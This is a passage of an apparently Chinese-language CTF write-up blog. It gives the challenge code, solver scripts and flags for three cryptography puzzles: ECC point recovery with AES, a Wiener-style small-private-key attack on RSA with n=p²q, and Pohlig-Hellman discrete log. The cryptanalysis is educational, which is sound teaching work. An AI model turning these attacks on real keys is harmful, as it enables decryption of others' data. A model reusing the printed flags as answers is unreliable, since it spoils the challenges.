<span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    enc = cipher.encrypt(pad(data, AES.block_size))</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line">p = <span class="number">9348030992978262347982920431034912130716881552084115381757548130699185130820479730646974634141092089651314678852571714802122984104452942803209295252010181</span></span><br><span class="line">a = <span class="number">7763518046982192251231517150944105482004832971680748456996310159078009542876654956303764776823623497403884988108392624824526960061132573798331838835960909</span></span><br><span class="line">b = <span class="number">10997613169313236085705837600762108982163011398922795151006166411501358991822489779966644769325114384948484844491824976044124478063235526767931678399125511</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    key = urandom(<span class="number">16</span>)</span><br><span class="line">    x = ZZ(bytes_to_long(key))</span><br><span class="line">    <span class="keyword">if</span> E.is_x_coord(x):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">enc = encrypt(flag, key)</span><br><span class="line">P = E.lift_x(x)</span><br><span class="line">Q = e * P</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Q = <span class="subst">&#123;(Q[<span class="number">0</span>], Q[<span class="number">1</span>])&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;enc = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Q = (702269728158503157149596097443623465665001736303612719716566418594125500303838352102906729735173073066319779069987350585597471722439620961396365725087358, 7741251535874845030195254089473397439416170375681731646623904995909698213716045714883145323049811857989495704699439881764120694648581710750825272993480662)</span></span><br><span class="line"><span class="string">enc = b&#x27;c\xea\x0eO\xf1V\n&quot;\xf4\xd5V\x10\x06\x85\xd8a\xe5`\xab\xd4\x9b\x96Fz+:\x0b\xaeg-\x92\xe6\xfb:\xc7\xaf\x1b&lt;\x04\xf0\x81\xb8\xbf\xc6\x96\x16q\x17\xd0\xb4F\x92L]\xa4\xe9|\xe1\xafg?\x1c\x88u&#123;\x91\xe5=\x0c\xdb\xb6S\x02\xdd4\x90F.\xe8\xa9&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = </span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">Q = </span><br><span class="line">Q=E.point(Q)</span><br><span class="line">d=inverse(e,E.order())</span><br><span class="line">P=d*Q</span><br><span class="line">x=P[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    dec = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line">enc = <span class="string">b&#x27;c\xea\x0eO\xf1V\n&quot;\xf4\xd5V\x10\x06\x85\xd8a\xe5`\xab\xd4\x9b\x96Fz+:\x0b\xaeg-\x92\xe6\xfb:\xc7\xaf\x1b&lt;\x04\xf0\x81\xb8\xbf\xc6\x96\x16q\x17\xd0\xb4F\x92L]\xa4\xe9|\xe1\xafg?\x1c\x88u&#123;\x91\xe5=\x0c\xdb\xb6S\x02\xdd4\x90F.\xe8\xa9&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(decrypt(enc, long_to_bytes(<span class="built_in">int</span>(x))))</span><br></pre></td></tr></table></figure><p><code>Q = e * P</code>，给定公私钥计算基点，<code>P = Q*inverse(e,E.order())</code><br /><code>cnss&#123;The elliptic curve 0ver a fin1te f1eld is an ab3lian group!&#125;</code></p><p>考点<code>ECC的简单解密，已知公私钥求基点+AES</code></p><h2 id="small-private-key"><a class="markdownIt-Anchor" href="#small-private-key"></a> 🔑 Small private key</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">2</span> * q</span><br><span class="line">beta = <span class="number">0.17</span></span><br><span class="line">d = getPrime(<span class="built_in">int</span>(n.bit_length() * beta))</span><br><span class="line">phi = p * (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = inverse(d, phi)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e = 99229505005010231229812309405118621210000665411317929329600320339351298536042106221904006618372016899838834315350282056201576780947332634472383794182914396787560149770087768346108970874622698958641239168672884943722683097496196568051260666405536471900271607250500649553508481028777575476228205350216263899864839231023168979708315202587104442940310612179957452668838181940302165426024768292895768359058100485442771122055233699699591861456009579197208612724634653</span></span><br><span class="line"><span class="string">n = 777932066471261253953635643543769273870576807001853821365002899038017652136640326606707541086305255419688451331308105858262381681205657118149670724969402173491693110671887550886032285747295962582655746980079520315019448934437742771629769039207570002600238133829941166519652324878087610266956030449933384381670213413005273221487049001640280300893616812980727738757188984406451974046745624206457936867759992076616467784551949417643382015447862723484003189099322113</span></span><br><span class="line"><span class="string">c = 315162533057119030644069576898014821746187831990641977888442441986396488578480924344830827691640071104116111429579458497274291449212879753454215527936892759921631840278976085540574066181311866181244489267112630519512826615435097016920565522260797348024774745088674028891909401404506165402416608686728774514537539009768594970540227164117320018763121106885108998344223691343126585144804733329828035450075042672319188914135360404008915353519214959250876459809490891</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ContinuedFraction</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        self.numberlist = []</span><br><span class="line">        self.fractionlist = []</span><br><span class="line">        self.GenerateNumberList(numerator, denumerator)</span><br><span class="line">        self.GenerateFractionList()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateNumberList</span>(<span class="params">self, numerator, denumerator</span>):</span><br><span class="line">        <span class="keyword">while</span> numerator != <span class="number">1</span>:</span><br><span class="line">            quotient = numerator//denumerator</span><br><span class="line">            remainder = numerator % denumerator</span><br><span class="line">            self.numberlist.append(quotient)</span><br><span class="line">            numerator = denumerator</span><br><span class="line">            denumerator = remainder</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GenerateFractionList</span>(<span class="params">self</span>):</span><br><span class="line">        self.fractionlist.append([self.numberlist[<span class="number">0</span>], <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.numberlist)):</span><br><span class="line">            numerator = self.numberlist[i]</span><br><span class="line">            denumerator = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                temp = numerator</span><br><span class="line">                numerator = denumerator+numerator*self.numberlist[i-j-<span class="number">1</span>]</span><br><span class="line">                denumerator = temp</span><br><span class="line">            self.fractionlist.append([numerator, denumerator])</span><br><span class="line">n_3 = gmpy2.iroot(n, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">near = n-(<span class="number">2</span>*<span class="built_in">pow</span>(n_3, <span class="number">2</span>)-n_3)</span><br><span class="line">a = ContinuedFraction(e, near)</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> k, d <span class="keyword">in</span> a.fractionlist:</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">    result.append(phi)</span><br><span class="line"><span class="keyword">for</span> phi <span class="keyword">in</span> result:</span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;cnss&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><code>d</code>很小，<code>winner attack</code>，根据<code>n=p**2*q</code>，找到一篇参考<br /><a href="https://iopscience.iop.org/article/10.1088/1742-6596/622/1/012019/pdf">https://iopscience.iop.org/article/10.1088/1742-6596/622/1/012019/pdf</a><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>≈</mo><mi>n</mi><mo>−</mo><mo stretchy="false">(</mo><mn>2</mn><mo>∗</mo><msup><mi>n</mi><mrow><mn>2</mn><mi mathvariant="normal">/</mi><mn>3</mn></mrow></msup><mo>−</mo><msup><mi>n</mi><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mn>3</mn></mrow></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)\approx n-(2*n^{2/3}-n^{1/3})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9713299999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">/</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">/</span><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br /><code>cnss&#123;Th1s is the p0wer of continu3d fr@ction hhhhhhh&#125;</code></p><p>考点<code>winner attack</code></p><h2 id="️-物不知数"><a class="markdownIt-Anchor" href="#️-物不知数"></a> 🐿️ 物不知数</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> prod</span><br><span class="line"><span class="keyword">from</span> Secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">256</span></span><br><span class="line">factors = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    factors.append(getPrime(<span class="number">64</span>))</span><br><span class="line">factors.append(getPrime(<span class="number">256</span>))</span><br><span class="line">n = prod(factors)</span><br><span class="line">g = <span class="number">7</span></span><br><span class="line">h = <span class="built_in">pow</span>(g, m, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, h)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 3322653117860796307881702118715938603299933196422318170688239817538863269879196751517883984368101175912757699818959313188577820238991745748791220070657861</span></span><br><span class="line"><span class="string">h = 2124833808496595853801133466156124859021541288125712571058299295082272671181015365259674266573518307514981326822864098542354452199064749348011358863682094</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">h = </span><br><span class="line">g = <span class="number">7</span></span><br><span class="line">factors = [<span class="number">12147669238962073417</span>, <span class="number">14971597303591082789</span>,</span><br><span class="line">           <span class="number">15677874518002551319</span>, <span class="number">16244778999786121217</span>]</span><br><span class="line">m_list = []</span><br><span class="line">n_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> factors:</span><br><span class="line">    R = GF(i)</span><br><span class="line">    <span class="comment"># m_list.append(discrete_log(R(h),R(g)))</span></span><br><span class="line">    m_list.append(R(h).log(R(g)))</span><br><span class="line">    n_list.append(i-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(crt(m_list, n_list)))</span><br></pre></td></tr></table></figure><p><a href="https://www.ruanx.net/pohlig-hellman/">https://www.ruanx.net/pohlig-hellman/</a><br /><a href="https://blog.miskcoo.com/2015/05/discrete-logarithm-problem">https://blog.miskcoo.com/2015/05/discrete-logarithm-problem</a><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>≡</mo><msup><mn>7</mn><mi>m</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo><mtext>，离散对数问题</mtext><mo stretchy="false">(</mo><mi>D</mi><mi>L</mi><mi>P</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h\equiv 7^{m}(mod\ n)，离散对数问题(DLP)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">7</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">问</span><span class="mord cjk_fallback">题</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>a</mi><mi>g</mi><mi>e</mi><mi>M</mi><mi>a</mi><mi>t</mi><mi>h</mi><mtext>里面实现的离散对数就是基于大步小步算法</mtext><mo stretchy="false">(</mo><mi>B</mi><mi>S</mi><mi>G</mi><mi>S</mi><mo stretchy="false">)</mo><mtext>和</mtext><mi>P</mi><mi>o</mi><mi>h</mi><mi>l</mi><mi>i</mi><mi>g</mi><mo>−</mo><mi>H</mi><mi>e</mi><mi>l</mi><mi>l</mi><mi>m</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">SageMath里面实现的离散对数就是基于大步小步算法(BSGS)和Pohlig-Hellman</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">法</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">o</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">m</span><span class="mord mathnormal">a</span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>有两种方法，但貌似第一个</mtext><mo stretchy="false">(</mo><mtext>注释掉的那个</mtext><mo stretchy="false">)</mo><mtext>太慢了</mtext></mrow><annotation encoding="application/x-tex">有两种方法，但貌似第一个(注释掉的那个)太慢了</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">种</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">貌</span><span class="mord cjk_fallback">似</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mopen">(</span><span class="mord cjk_fallback">注</span><span class="mord cjk_fallback">释</span><span class="mord cjk_fallback">掉</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">个</span><span class="mclose">)</span><span class="mord cjk_fallback">太</span><span class="mord cjk_fallback">慢</span><span class="mord cjk_fallback">了</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><msup><mi>g</mi><mi>m</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi><mo stretchy="false">)</mo><mtext>，两边取指标，</mtext><mi>I</mi><mi>n</mi><msub><mi>d</mi><mi>g</mi></msub><mi>h</mi><mo>=</mo><mi>m</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h=g^{m}(mod\ p)，两边取指标，Ind_{g}h=m\ mod\ \phi(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">边</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal">n</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>所以，实际上我们</mtext><mi>B</mi><mi>A</mi><mi>G</mi><mi>S</mi><mtext>得到的</mtext><mi>m</mi><mtext>，是在模</mtext><mi>ϕ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mtext>下的</mtext></mrow><annotation encoding="application/x-tex">所以，实际上我们BAGS得到的m，是在模\phi(p)下的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">际</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">A</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">的</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><msub><mi>m</mi><mi>i</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M=m_{i}\ mod\ \phi (p_{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mtext>的最后一个因子比较大，为减少运行时间，</mtext><mi>C</mi><mi>R</mi><mi>T</mi><mtext>依靠前四个因子也能求解</mtext></mrow><annotation encoding="application/x-tex">n的最后一个因子比较大，为减少运行时间，CRT依靠前四个因子也能求解</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">较</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">减</span><span class="mord cjk_fallback">少</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback">依</span><span class="mord cjk_fallback">靠</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">四</span><span class="mord cjk_fallback">个</span><span class="mord 